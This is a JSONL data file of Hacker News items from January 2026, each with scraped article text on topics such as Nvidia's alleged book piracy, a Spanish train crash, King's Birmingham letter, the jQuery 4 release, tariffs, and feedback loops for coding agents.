{"title": "Nvidia contacted Anna's Archive to access books", "url": "https://torrentfreak.com/nvidia-contacted-annas-archive-to-secure-access-to-millions-of-pirated-books/", "content": "Nvidia contacted Anna's Archive to access books. Chip giant NVIDIA has been one of the main financial beneficiaries in the artificial intelligence boom. Revenue surged due to high demand for its AI-learning chips and data center services, and the end doesn’t appear to be in sight. Besides selling the most sought-after hardware, NVIDIA is also developing its own models, including NeMo, Retro-48B, InstructRetro, and Megatron. These are trained using their own hardware and with help from large text libraries, much like other tech giants do. Like other tech companies, NVIDIA has also seen significant legal pushback from copyright holders in response to its training methods. This includes authors, who, in various lawsuits, accused tech companies of training their models on pirated books. In early 2024, for example, several authorssued NVIDIAover alleged copyright infringement. Through the class action lawsuit, they claimed that the company’s AI models were trained on the Books3 dataset that included copyrighted works taken from the ‘pirate’ site Bibliotik. Since this happened without permission, the authors demanded compensation. In response, NVIDIAdefended its actionsas fair use, noting that books are nothing more than statistical correlations to its AI models. However, the allegations didn’t go away. On the contrary, the plaintiffs found more evidence during discovery. Last Friday, the authors filed an amended complaint that significantly expands the scope of the lawsuit. In addition to adding more books, authors, and AI models, it also includes broader “shadow library” claims and allegations. The authors, includingAbdi Nazemian, now cite various internal Nvidia emails and documents, suggesting that the company willingly downloaded millions of copyrighted books. The new complaint alleges that “competitive pressures drove NVIDIA to piracy”, which allegedly included collaborating with the controversial Anna’s Archive library.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "High-speed train collision in Spain kills at least 39", "url": "https://www.bbc.com/news/articles/cedw6ylpynyo", "content": "High-speed train collision in Spain kills at least 39. At least 39 people have died in a train collision in southern Spain and dozens more have been injured in the country's worst rail crash in more than a decade, Spain's Civil Guard has said. Carriages on a Madrid-bound train derailed and crossed over to the opposite tracks, colliding with an oncoming train in Adamuz on Sunday evening. Four hundred passengers and staff were onboard both trains, the rail networks said. Emergency services treated 122 people, with 43, including four children, still in hospital. Of those, 12 adults and one child are in intensive care. Spanish Transport Minister Óscar Puente said the death toll \"is not yet final\", as officials launched an investigation. Puente described the incident as \"extremely strange\". All the railway experts consulted by the government \"are extremely baffled by the accident\", he told reporters in Madrid. Rail network operator Adif said the collision happened at 19:45 local time (18:45 GMT), about an hour after the train left Málaga heading northto Madrid, when it derailed on a straight stretch of track near the city of Córdoba. The force of the crash pushed the carriages of the second train into an embankment, Puente said. He added that most of those killed and injured were in the front carriages of the second train, which was travelling southfrom Madrid to Huelva. The type of train involved in the crash was a Freccia 1000, which can reach top speeds of 400 km/h (250 mph), a spokesperson for the Italian rail company Ferrovie dello Stato told Reuters news agency. Rescue teams said the twisted wreckage of the trains made it difficult to recover people trapped inside the carriages. Córdoba fire chief Francisco Carmona told Spanish public broadcaster RTVE: \"We have even had to remove a dead person to be able to reach someone alive. It is hard, tricky work.\"", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Letter from a Birmingham Jail (1963)", "url": "https://www.africa.upenn.edu/Articles_Gen/Letter_Birmingham.html", "content": "Letter from a Birmingham Jail (1963). 16 April 1963My Dear Fellow Clergymen:While confined here in the Birmingham city jail, I came across your recent statement\ncalling\nmy present activities \"unwise and untimely.\" Seldom do I pause to answer criticism of my\nwork and\nideas. If I sought to answer all the criticisms that cross my desk, my secretaries would\nhave little time\nfor anything other than such correspondence in the course of the day, and I would have no\ntime for\nconstructive work. But since I feel that you are men of genuine good will and that your\ncriticisms are\nsincerely set forth, I want to try to answer your statement in what I hope will be patient\nand\nreasonable terms. I think I should indicate why I am here in Birmingham, since you have been influenced\nby the\nview which argues against \"outsiders coming in.\" I have the honor of serving as president\nof the\nSouthern Christian Leadership Conference, an organization operating in every southern\nstate, with\nheadquarters in Atlanta, Georgia. We have some eighty five affiliated organizations across\nthe South,\nand one of them is the Alabama Christian Movement for Human Rights. Frequently we share\nstaff,\neducational and financial resources with our affiliates. Several months ago the affiliate\nhere in\nBirmingham asked us to be on call to engage in a nonviolent direct action program if such\nwere\ndeemed necessary. We readily consented, and when the hour came we lived up to our promise.\nSo I,\nalong with several members of my staff, am here because I was invited here.  I am here\nbecause I have\norganizational ties here. But more basically, I am in Birmingham because injustice is here. Just as the prophets\nof the\neighth century B.C. left their villages and carried their \"thus saith the Lord\" far beyond\nthe boundaries\nof their home towns, and just as the Apostle Paul left his village of Tarsus and carried\nthe gospel of\nJesus Christ to the far corners of the Greco Roman world, so am I compelled to carry the\ngospel of\nfreedom beyond my own home town. Like Paul, I must constantly respond to the Macedonian\ncall for\naid. Moreover, I am cognizant of the interrelatedness of all communities and states. I\ncannot sit idly\nby in Atlanta and not be concerned about what happens in Birmingham. Injustice anywhere is\na threat\nto justice everywhere. We are caught in an inescapable network of mutuality, tied in a\nsingle garment\nof destiny. Whatever affects one directly, affects all indirectly. Never again can we\nafford to live with\nthe narrow, provincial \"outside agitator\" idea. Anyone who lives inside the United States\ncan never be\nconsidered an outsider anywhere within its bounds. You deplore the demonstrations taking place in Birmingham. But your statement, I am\nsorry to\nsay, fails to express a similar concern for the conditions that brought about the\ndemonstrations. I am\nsure that none of you would want to rest content with the superficial kind of social\nanalysis that deals\nmerely with effects and does not grapple with underlying causes. It is unfortunate that\ndemonstrations are taking place in Birmingham, but it is even more unfortunate that the\ncity's white\npower structure left the Negro community with no alternative. In any nonviolent campaign there are four basic steps: collection of the facts to\ndetermine\nwhether injustices exist; negotiation; self purification; and direct action. We have gone\nthrough all\nthese steps in Birmingham. There can be no gainsaying the fact that racial injustice\nengulfs this\ncommunity. Birmingham is probably the most thoroughly segregated city in the United\nStates. Its ugly\nrecord of brutality is widely known. Negroes have experienced grossly unjust treatment in\nthe courts.\nThere have been more unsolved bombings of Negro homes and churches in Birmingham than in\nany\nother city in the nation. These are the hard, brutal facts of the case. On the basis of\nthese conditions,\nNegro leaders sought to negotiate with the city fathers. But the latter consistently\nrefused to engage\nin good faith negotiation. Then, last September, came the opportunity to talk with leaders of Birmingham's\neconomic\ncommunity. In the course of the negotiations, certain promises were made by the\nmerchants--for\nexample, to remove the stores' humiliating racial signs. On the basis of these promises,\nthe Reverend\nFred Shuttlesworth and the leaders of the Alabama Christian Movement for Human Rights\nagreed to a\nmoratorium on all demonstrations. As the weeks and months went by, we realized that we\nwere the\nvictims of a broken promise. A few signs, briefly removed, returned; the others remained.\nAs in so many past experiences, our hopes had been blasted, and the shadow of deep\ndisappointment settled upon us. We had no alternative except to prepare for direct action,\nwhereby\nwe would present our very bodies as a means of laying our case before the conscience of\nthe local and\nthe national community. Mindful of the difficulties involved, we decided to undertake a\nprocess of self\npurification. We began a series of workshops on nonviolence, and we repeatedly asked\nourselves: \"Are\nyou able to accept blows without retaliating?\" \"Are you able to endure the ordeal of\njail?\" We decided\nto schedule our direct action program for the Easter season, realizing that except for\nChristmas, this is\nthe main shopping period of the year. Knowing that a strong economic-withdrawal program\nwould be\nthe by product of direct action, we felt that this would be the best time to bring\npressure to bear on\nthe merchants for the needed change. Then it occurred to us that Birmingham's mayoral election was coming up in March, and\nwe\nspeedily decided to postpone action until after election day. When we discovered that the\nCommissioner of Public Safety, Eugene \"Bull\" Connor, had piled up enough votes to be in\nthe run off,\nwe decided again to postpone action until the day after the run off so that the\ndemonstrations could\nnot be used to cloud the issues. Like many others, we waited to see Mr. Connor defeated,\nand to this\nend we endured postponement after postponement. Having aided in this community need, we\nfelt\nthat our direct action program could be delayed no longer. You may well ask: \"Why direct action? Why sit ins, marches and so forth? Isn't\nnegotiation a\nbetter path?\" You are quite right in calling for negotiation. Indeed, this is the very\npurpose of direct\naction. Nonviolent direct action seeks to create such a crisis and foster such a tension\nthat a\ncommunity which has constantly refused to negotiate is forced to confront the issue. It\nseeks so to\ndramatize the issue that it can no longer be ignored. My citing the creation of tension as\npart of the\nwork of the nonviolent resister may sound rather shocking. But I must confess that I am\nnot afraid of\nthe word \"tension.\" I have earnestly opposed violent tension, but there is a type of\nconstructive,\nnonviolent tension which is necessary for growth. Just as Socrates felt that it was\nnecessary to create a\ntension in the mind so that individuals could rise from the bondage of myths and half\ntruths to the\nunfettered realm of creative analysis and objective appraisal, so must we see the need for\nnonviolent\ngadflies to create the kind of tension in society that will help men rise from the dark\ndepths of\nprejudice and racism to the majestic heights of understanding and brotherhood.\nThe purpose of our direct action program is to create a situation so crisis packed that it\nwill\ninevitably open the door to negotiation. I therefore concur with you in your call for\nnegotiation. Too\nlong has our beloved Southland been bogged down in a tragic effort to live in monologue\nrather than\ndialogue. One of the basic points in your statement is that the action that I and my associates\nhave\ntaken in Birmingham is untimely. Some have asked: \"Why didn't you give the new city\nadministration\ntime to act?\" The only answer that I can give to this query is that the new Birmingham\nadministration\nmust be prodded about as much as the outgoing one, before it will act. We are sadly\nmistaken if we\nfeel that the election of Albert Boutwell as mayor will bring the millennium to\nBirmingham. While Mr.\nBoutwell is a much more gentle person than Mr. Connor, they are both segregationists,\ndedicated to\nmaintenance of the status quo. I have hope that Mr. Boutwell will be reasonable enough to\nsee the\nfutility of massive resistance to desegregation. But he will not see this without pressure\nfrom devotees\nof civil rights. My friends, I must say to you that we have not made a single gain in\ncivil rights without\ndetermined legal and nonviolent pressure. Lamentably, it is an historical fact that\nprivileged groups\nseldom give up their privileges voluntarily. Individuals may see the moral light and\nvoluntarily give up their unjust posture; but, as Reinhold Niebuhr has reminded us, groups\ntend to be more immoral than\nindividuals.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "jQuery 4", "url": "https://blog.jquery.com/2026/01/17/jquery-4-0-0/", "content": "jQuery 4. On January 14, 2006, John Resig introduced a JavaScript library called jQuery at BarCamp in New York City. Now, 20 years later, the jQuery team is happy to announce the final release of jQuery 4.0.0. After a long development cycle and several pre-releases, jQuery 4.0.0 brings many improvements and modernizations. It is the first major version release in almost 10 years and includes some breaking changes, so be sure to read through the details below before upgrading. Still, we expect that most users will be able to upgrade with minimal changes to their code. Many of the breaking changes are ones the team has wanted to make for years, but couldn’t in a patch or minor release. We’ve trimmed legacy code, removed some previously-deprecated APIs, removed some internal-only parameters to public functions that were never documented, and dropped support for some “magic” behaviors that were overly complicated. We have anupgrade guideandjQuery Migrate plugin releaseready to assist with the transition. Please upgrade andlet us know if you encounter any issues. As usual, the release is available onour CDNand the npm package manager. Other third party CDNs will probably have it available soon as well, but remember that we don’t control their release schedules and they will need some time. Here are the highlights for jQuery 4.0.0. jQuery 4.0 drops support for IE 10 and older. Some may be asking why we didn’t remove support for IE 11. We plan to remove support in stages, and the next stepwill be released in jQuery 5.0. For now, we’ll start by removing code specifically supporting IE versions older than 11. We also dropped support for other very old browsers, including Edge Legacy, iOS versions earlier than the last 3, Firefox versions earlier than the last 2 (aside from Firefox ESR), and Android Browser. No changes should be required on your end. If you need to support any of these browsers, stick with jQuery 3.x. jQuery 4.0 adds support forTrusted Types, ensuring that HTML wrapped inTrustedHTMLcan be used as input to jQuery manipulation methods in a way that doesn’t violate therequire-trusted-types-forContent Security Policy directive. Along with this, while some AJAX requests were already using<script>tags to maintain attributes such ascrossdomain, we havesince switched most asynchronous script requests to use <script> tagsto avoid any CSP errors caused by using inline scripts. There are still a few cases where XHR is used for asynchronous script requests, such as when the\"headers\"option is passed (usescriptAttrsinstead!), but we now use a<script>tag whenever possible. It was a special day when the jQuery source on themainbranch was migrated fromAMDtoES modules. The jQuery source has always been published with jQuery releases on npm and GitHub, but could not be imported directly as modules withoutRequireJS, which was jQuery’s build tool of choice. We have since switched toRollupfor packaging jQuery and we do run all tests on the ES modules separately. This makes jQuery compatible with modern build tools, development workflows, and browsers through the use of<script type=module>. These functions have been deprecated for several versions. It’s time to remove them now that we’ve reached a major release. These functions were either always meant to be internal or ones that now have native equivalents in all supported browsers. The removed functions include:", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "A Social Filesystem", "url": "https://overreacted.io/a-social-filesystem/", "content": "A Social Filesystem. January 18, 2026 Remember files? .doc.doc.doc.doc.jpg.jpg.svg You write a document, hit save, and the file is on your computer. It’s yours. You can inspect it, you can send it to a friend, and you can open it with other apps. Files come from the paradigm ofpersonal computing. This post, however, isn’t about personal computing. What I want to talk about issocial computing—apps like Instagram, Reddit, Tumblr, GitHub, and TikTok. What do files have to do with social computing? Historically, not a lot—until recently. aliceownsownsbob.doc.doc.doc.doc.doc.docpostpost.jpg.jpg.jpg.jpg.jpg.jpg.jpg.jpgfollowfollowvotevote But first, a shoutout to files.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Show HN: Lume 0.2 – Build and Run macOS VMs with unattended setup", "url": "https://cua.ai/docs/lume/guide/getting-started/introduction", "content": "Show HN: Lume 0.2 – Build and Run macOS VMs with unattended setup. Introduction to Lume - the macOS VM CLI and framework Lume is a VM runtime for building AI agents, running CI/CD pipelines, and automating macOS. It uses Apple's native Virtualization Framework to run macOS and Linux VMs at near-native speed on Apple Silicon. MIT License Lume is open-source and MIT licensed. If you find it useful, we'd appreciate astar on GitHub! Cloud macOS Sandboxes We're piloting a managed service for customers who want to run cloud macOS sandboxes for CI/CD and agent workloads.Book a demoif you're interested. A single binary with an HTTP API. Create a VM, run it headlessly, control it programmatically.  You can use Lume directly via CLI, or runlume serveto expose an HTTP API for programmatic access. TheComputer SDKuses this API to automate macOS interactions. Lume is a thin layer over Apple'sVirtualization Framework, which provides hardware-accelerated virtualization on Apple Silicon. This gives you:", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "The space and motion of communicating agents (2008) [pdf]", "url": "https://www.cl.cam.ac.uk/archive/rm135/Bigraphs-draft.pdf", "content": "The space and motion of communicating agents (2008) [pdf]", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Starlink users must opt out of all browsing data being used to train xAI models", "url": "https://twitter.com/cryps1s/status/2013345999826153943", "content": "Starlink users must opt out of all browsing data being used to train xAI models", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "American importers and consumers bear the cost of 2025 tariffs: analysis", "url": "https://www.kielinstitut.de/publications/americas-own-goal-who-pays-the-tariffs-19398/", "content": "American importers and consumers bear the cost of 2025 tariffs: analysis. Policy Article Tariffs Trade Policy Pass-Through Import Prices United States International Trade USA • The 2025 US tariffs are an own goal: American importers and consumers bear nearly the entire cost. Foreign exporters absorb only about 4% of the tariff burden—the remaining 96% is passed through to US buyers.• Using shipment-level data covering over 25 million transactions valued at nearly $4 trillion, we find near-complete pass-through of tariffs to US import prices.• US customs revenue surged by approximately $200 billion in 2025—a tax paid almost entirely by Americans.• Event studies around discrete tariff shocks on Brazil (50%) and India (25–50%) confirm: export prices did not decline. Trade volumes collapsed instead.• Indian export customs data validates our findings: when facing US tariffs, Indian exporters maintained their prices and reduced shipments. They did not “eat” the tariff. • The 2025 US tariffs are an own goal: American importers and consumers bear nearly the entire cost. Foreign exporters absorb only about 4% of the tariff burden—the remaining 96% is passed through to US buyers.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Texas police invested in phone-tracking software and won’t say how it’s used", "url": "https://www.texasobserver.org/texas-police-invest-tangles-sheriff-surveillance/", "content": "Texas police invested in phone-tracking software and won’t say how it’s used", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Wikipedia: WikiProject AI Cleanup", "url": "https://en.wikipedia.org/wiki/Wikipedia:WikiProject_AI_Cleanup", "content": "Wikipedia: WikiProject AI Cleanup. Welcome toWikiProject AI Cleanup, a collaboration to combat the increasing problem of unsourced, poorly writtenAI-generated content on Wikipedia. If you would like to help,add yourself as a participantin the project, inquire on thetalk page, and see theto-do list. Since 2022,large language models(LLMs) likeGPTshave become a convenient tool for writing at scale. Unfortunately, these models virtually always fail to properly source claims and often introduce errors. Essays likeWP:LLMstrongly encourage care in using them for editing articles. These are the project's goals: The purpose of this project isnotto restrict or ban the use of AI in articles, but to verify that its output is acceptable and constructive, and to fix or remove it otherwise. SeeCategory:Articles containing suspected AI-generated textsfor all articles that have been tagged as possibly{{AI-generated}}. Thetasks pagerecommends ways to handle articles, talk page discussions, and sources that use AI-generated content. Primary contacts: Feel free to add yourself here! These threads may be useful for editors seeking information about how AI has previously been handled on Wikipedia. Want to update this table?  Tryusing the visual editor to edit this page.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Astrophotography visibility plotting and planning tool", "url": "https://airmass.org/", "content": "Astrophotography visibility plotting and planning tool.  Or upload a text file: Show field of view of an instrument...  Altitude limits... Set start month... Hours above°(airmass2.00)during24 hoursnightastronomical night", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Ask HN: COBOL devs, how are AI coding affecting your work?", "url": "item?id=46678550", "content": "Ask HN: COBOL devs, how are AI coding affecting your work?", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "The Code-Only Agent", "url": "https://rijnard.com/blog/the-code-only-agent", "content": "The Code-Only Agent. When Code Execution Really is All You Need  If you're building an agent, you're probably overwhelmed. Tools.\n            MCP. Subagents. Skills. The ecosystem pushes you toward complexity,\n            toward \"the right way\" to do things. You should know: Concepts like\n            \"Skills\" and \"MCP\" are actually outcomes of anongoing learning processof humans figuring stuff out. The\n            space iswide openfor exploration. With this mindset I\n            wanted to try something different. Simplify the assumptions. What if the agent only hadone tool? Not just any tool, but the most powerful one. TheTuring-completeone:execute code. Truly one tool means: no `bash`, no `ls`, no `grep`. Onlyexecute_code. And youenforceit. When you watch an agent run, you might think: \"I wonder what tools\n            it'll use to figure this out. Oh look, it ran `ls`. That makes\n            sense. Next, `grep`. Cool.\" The simpler Code-Only paradigm makes that question irrelevant. The\n            question shifts from \"what tools?\" to \"what code will it produce?\"\n            And that's when things get interesting. Traditional prompting works like this: > Agent, dothing> Agentrespondswiththing Contrast with:", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Open source's new mission: Rebuild the EU tech stack", "url": "https://www.theregister.com/2026/01/19/open_sources_new_mission_rebuild/", "content": "Open source's new mission: Rebuild the EU tech stack. OpinionEurope is famous for having the most tightly regulated non-existent tech sector in the world. This is a mildly unfair characterization, as there are plenty of tech enterprises across the continent, quite a respectable smattering if it wasn't for the US doing everything at least ten times bigger. Quite the problem, sighed the EU’s2024 Draghi Reporton European competitiveness. Those regulations regressively hit startups and SMEs the hardest, there's no central capital market for funding innovation, while Uncle Sam's wallet opens wide for the ambitious and talented. It looked bad in 2024, when tech deficit was primarily an economic matter. Mix in the changes since then, and you can apply the five word version of all Russian history — \"And then it got worse.\" Which is why the EU is noweagerly looking to open source as part of digital decolonization. It wants to end dependency on American software and services, not just for a healthier and more influential home sector, but to protect itself from hostile leverage. The EU being the way it is, it wants to think big, and there's no doubt that FOSS has an infinite appetite for resources and relevance. FOSS is also mostly immune to EU regulations, which exist to protect citizens from systematic abuse. That possibility barely exists in open source development. You don't have to tell a bird not to rob banks. It's just that you couldn't find a bigger culture clash between top-down and bottom-up if you invested a billion euros on a 27-nation research project. Finding the sweet spot where EU involvement can make the biggest difference to FOSS enterprise adoption, while maintaining the essential spark of agility and freedom that brings FOSS alive, that's where technical, economic and cultural engineering needs to happen. Fast. Open source by itself is no guarantee of independence. Linux is the giant hogweed of European open source, even if it started four years before its home nation of Finland joined the EU. It has kept the internet and supercomputing free of commercial or state monopoly. The best it could do in mobile, though, is maintenance of an American OS duopoly. In the enterprise and public sector, it has done nothing to crimp Microsoft's tendrils. Which is where the EU most desperately needs it to succeed. And this is not for want of technical prowess, nor interoperability. In fact, there is far too much. Linux desktops have been enterprise-class for more than a decade, and of late the options for integration with Windows apps and functionality have flowered like fridge contents in a midsummer power cut. As Windows has got worse, the interoperable Linux choices have become better. There are many options.Wine just gets better and better, no matter what distro you use. Windows-focused distros like Zorin OS come with lots of ways to look and function like Windows, including web app integration so online Word and Outlook integrate with the desktop. Products like Winboat offer highly optimized containerization to bring Windows apps to near-native Linux behavior. High performance specialized emulations like Winlator can run native x86 games — the good ones — on Android. What all these show is that small teams, even one-man bands, can use the very high quality software components freely available to almost completely remove old ideas of performance and functionality as batteries to platform-independent computing. The skills, the tools, the hardware and the whole production chain have been democratized. Given motivation and modest resources, FOSS designers can work miracles — and will. The downside is that there are too many good choices, making selection and support untenable in most organizations. Windows is Windows is Windows. Or it would be, if Microsoft stopped mucking about. What FOSS per se is bad at, is synchronizing with specific needs. It can do it with the right people, see Red Hat, but those people can also take it into darkness. Stare too long into the abyss, and the enterprise stares back at you. Focus, alignment, the disciplines of documentation, support and detail, get harder the more complex a system becomes.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Nearly all Epstein files still unreleased a month after Congress deadline", "url": "https://www.theguardian.com/us-news/2026/jan/19/jeffrey-epstein-files-unreleased-trump-doj", "content": "Nearly all Epstein files still unreleased a month after Congress deadline. Over 2 million documents are under DoJ review despite ‘legal obligation’ from Epstein Files Transparency Act The law was clear:Donald Trump’s Department of Justice was required to disclose all investigative files onJeffrey Epsteinby 19 December 2025, with rare exceptions. One month after this deadline mandated byCongress’s Epstein Files Transparency Act, however, Trump’s justice department hasnot compliedwith this law, prompting questions about when – and whether – authorities will ever release investigative documents about the late sex offender. Justice department attorneyssaidin a 5 January Manhattan court filing that they hadpostedapproximately 12,285 to DoJ’s website, equating to some 125,575 pages, under this legislation’s requirements. They said in this same letter that justice department staff had identified “more than 2 million documents potentially responsive to the Act that are in various phases of review”. That these DoJ’s disclosures apparently comprise a drop in the bucket – and have done little to shed light on how Epsteinoperated with apparent impunityfor years – has roiled survivors’ advocates and lawmakers. They include attorney Spencer Kuvin, who has represented dozens of Epstein’s survivors. “Congress did not create a discretionary timeline – it created a legal obligation. Every day these records remain withheld sends a message to victims that transparency is optional when powerful interests are involved,” Kuvin said. “For survivors of Epstein’s abuse, this delay is not procedural – it is personal. “These files are not abstract government records; they are evidence of how institutions failed children. Continued secrecy retraumatises victims and undermines public confidence in the justice system,” he said. Some are now calling for judicial intervention, asking a judge to implement a special master who could facilitate the release of these documents. Democrat Ro Khanna and Republican Thomas Massie, the congressmen who co-sponsored the act,askedManhattan federal court judge Paul Engelmayer to appoint a special master and independent monitor “to compel the Department of Justice (DOJ) to make mandatory production under the Act”. “We have urgent and grave concerns about DOJ’sfailure to complywith the Act as well as the Department’s violations of this Court’s order,” they said in an 8 Januaryletterto Engelmayer. “On December 19, 2025, the Department of Justice released only a portion of responsive materials. That release, however, did not comply with the statute as written.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Trump Shares Map of US Including Greenland, Canada, Venezuela", "url": "https://www.newsweek.com/trump-shares-map-of-us-including-greenland-canada-venezuela-11384438", "content": "Trump Shares Map of US Including Greenland, Canada, Venezuela. US News Reporter President Donald Trump has shared an image, seemingly AI-edited, that shows him sitting alongside a map of the U.S. that includes Greenland, Canada and Venezuela as he speaks with European leaders. The picture, which Trumppostedon Truth Social, appears to be an edited version of a photograph taken when leaders—including French President Emmanuel Macron, British Prime Minister Keir Starmer and European Commission President Ursula von der Leyen—went to Washington, D.C., in August 2025. Newsweekhas contacted the White House for comment via email outside normal working hours and the government of Greenland. Since returning to office in January 2025, Trump has repeatedlyremarked on annexing Canadaas the 51st state. Earlier this month, he posted an image on social media that described him as the \"Acting President of Venezuela,\" following the U.S. capture of leader Nicolás Maduro. Trump's latest post comes amid his long-running claim that the U.S.should acquire Greenland, a self-governing Danish territory, for national security reasons. The president hasdeclined to rule outthe use of military force to gain control of the Arctic island andhas threatened tariffson European allies resistant to such a takeover. As European leaders have vowed solidarity with Denmark and Greenland, the social media post underscores the widening diplomatic rift between Washington and the Continent. The image of the map appears to be an edited version of aphototaken in August, whenEuropean leaders visited Washingtonfor Trump's phone call with Russian President Vladimir Putin. Another AI-generatedimageshows Trump, Vice President JD Vance and Secretary of State Marco Rubio in Greenland, with Trump planting an American flag in the ground next to a sign that says, \"Greenland—U.S. Territory. Est. 2026.\" Trump recently told reporters that European allies would not \"push back too much\" on his plans to acquire Greenland, adding, \"We have to have it.\"", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Command-line Tools can be 235x Faster than your Hadoop Cluster (2014)", "url": "https://adamdrake.com/command-line-tools-can-be-235x-faster-than-your-hadoop-cluster.html", "content": "Command-line Tools can be 235x Faster than your Hadoop Cluster (2014). Adam Drake Jan 18, 2014 As I was browsing the web and catching up on some sites I visit periodically, I found a cool article fromTom Haydenabout usingAmazon Elastic Map Reduce(EMR) andmrjobin order to compute some statistics on win/loss ratios for chess games he downloaded from themillionbase archive, and generally have fun with EMR. Since the data volume was only about 1.75GB containing around 2 million chess games, I was skeptical of using Hadoop for the task, but I can understand his goal of learning and having fun with mrjob and EMR. Since the problem is basically just to look at the result lines of each file and aggregate the different results, it seems ideally suited to stream processing with shell commands. I tried this out, and for the same amount of data I was able to use my laptop to get the results in about 12 seconds (processing speed of about 270MB/sec), while the Hadoop processing took about 26 minutes (processing speed of about 1.14MB/sec). After reporting that the time required to process the data with 7 c1.medium machine in the cluster took 26 minutes, Tom remarks This is probably better than it would take to run serially on my machine but probably not as good as if I did some kind of clever multi-threaded application locally. This is absolutely correct, although even serial processing may beat 26 minutes. Although Tom was doing the project for fun, often people use Hadoop and other so-calledBig Data (tm)tools for real-world processing and analysis jobs that can be done faster with simpler tools and different techniques. One especially under-used approach for data processing is using standard shell tools and commands. The benefits of this approach can be massive, since creating a data pipeline out of shell commands means that all the processing steps can be done in parallel. This is basically like having your ownStormcluster on your local machine. Even the concepts of Spouts, Bolts, and Sinks transfer to shell pipes and the commands between them. You can pretty easily construct a stream processing pipeline with basic commands that will have extremely good performance compared to many modernBig Data (tm)tools. An additional point is the batch versus streaming analysis approach. Tom mentions in the beginning of the piece that after loading 10000 games and doing the analysis locally, that he gets a bit short on memory. This is because all game data is loaded into RAM for the analysis. However, considering the problem for a bit, it can be easily solved with streaming analysis that requires basically no memory at all. The resulting stream processing pipeline we will create will be over 235 times faster than the Hadoop implementation and use virtually no memory. The first step in the pipeline is to get the data out of the PGN files. Since I had no idea what kind of format this was, I checked it out onWikipedia. We are only interested in the results of the game, which only have 3 real outcomes. The 1-0 case means that white won, the 0-1 case means that black won, and the 1/2-1/2 case means the game was a draw. There is also a-case meaning the game is ongoing or cannot be scored, but we ignore that for our purposes.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Mammals have evolved into ant eaters 12 times since the dinosaur age – study (2025)", "url": "https://phys.org/news/2025-07-mammals-evolved-ant-eaters-dinosaur.html", "content": "Mammals have evolved into ant eaters 12 times since the dinosaur age – study (2025). share this! 502 Tweet Share Email July 16, 2025 by Jesse Jenkins,New Jersey Institute of Technology edited byStephanie Baum, \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\treviewed byAndrew Zinin  ", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Provide agents with automated feedback", "url": "https://banay.me/dont-waste-your-backpressure/", "content": "Provide agents with automated feedback. You might notice a pattern in the most successful applications of agents over the last year. Projects that are able to\nsetup structure around the agent itself, to provide it with automated feedback on quality and correctness, have been able\nto push them to work on longer horizon tasks. Thisback pressurehelps the agent identify mistakes as it progresses and models are now good enough that this feedback\ncan keep them aligned to a task for much longer. As an engineer, this means you can increase your leverage by delegating\nprogressively more complex tasks to agents, while increasing trust that when completed they are at a satisfactory standard. Imagine for a second if you only gave an agent tools that allow it to edit files. Without a way to interact with a build\nsystem the model relies on you for feedback about whether or not the change it made is sensible. This means you spendyourback pressure (the time you spend giving feedback to agents) on typing a message telling the agent it missed an import. This\nscales poorly and limits you to working on simple problems. If you’re directly responsible for checking each line of code produced is syntactically valid, then that’s time taken away\nfrom thinking about the larger goals or problems in your software. You’re going to struggle to derive more leverage out of\nagents because you are caught up in trivial changes. If instead you give the agent tools that allow it to run bash commands,\nit can run a build, read the feedback, and correct itself. You remove yourself from needing to be involved in those tasks\nand can instead focus on higher complexity tasks. Languages with expressive type systems have beengrowing in popularityin part\nbecause of back pressure. Type systems allow you to describe better contracts in your program. They can let you avoid it\nfrom even being possible to represent invalid states in your program. They can help you to identify edge cases that you\nmight not handle. Being able to lean on these features is another form of creating back pressure which you can direct as\nfeedback on changes made by an agent. Bonus points go to languages that work to produce excellent error messages (thinkRust,Elmand evenPython). These messages are fed directly back into the LLM so the more guidance or even\nsuggested resolutions the better. Another example of back pressure is the rapid uptake in people giving agents a way to see rendered pages using MCP servers\nfor Playwright or Chrome DevTools. In either case these tools give the agent a way to be able to make a change and compare\nan expectation of what it might see in the UI against a result. Attaching these tools mean you remove yourself from needing\nto keep telling the agent that you’re not seeing a UI element load correctly or something isn’t centered. Not working on a\nUI application? Use MCP servers that bridge to LSPs for lints or other feedback. Even outside of engineering tasks, proof assistants like Lean combined with AI (see recent work on theErdős Problemswhich was solved by Kevin Barreto and Liam Price by using\nAristotle to formalise a proof written by GPT-5.2 Pro into Lean), randomized fuzzing to evaluate correctness whengenerating CUDA kernelsor logic programming with agents are all\npowerful combinations because they let you keep pulling the LLM slot machine lever until the result you have can be trusted.\nI think that the payoff of investing into higher quality testing is growing massively, and an increasing part of engineering\nwill involve designing and building back pressure in order to scale the rate at which contributions from agents can be\naccepted. If you’re doing spec-driven development and you want the agent to generate a specific API schema, setup automatic generation\nof documentation based on the OpenAPI schema from your application so the agent can compare the result it produced and what\nit intended on making. There are many more techniques you can apply similar to this once you recognize the pattern. In your projects you should think about how you can build back pressure into your workflow and once you have it, you canloop agentsuntil they have stamped out all of the inconsistencies and issues for you.\nWithout it, you’re going to be stuck spending your time telling the agent about each mistake it makes yourself.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Ask HN: Share your personal website", "url": "item?id=46618714", "content": "Ask HN: Share your personal website", "source": "HackerNews", "date": null, "author": null, "score": null}
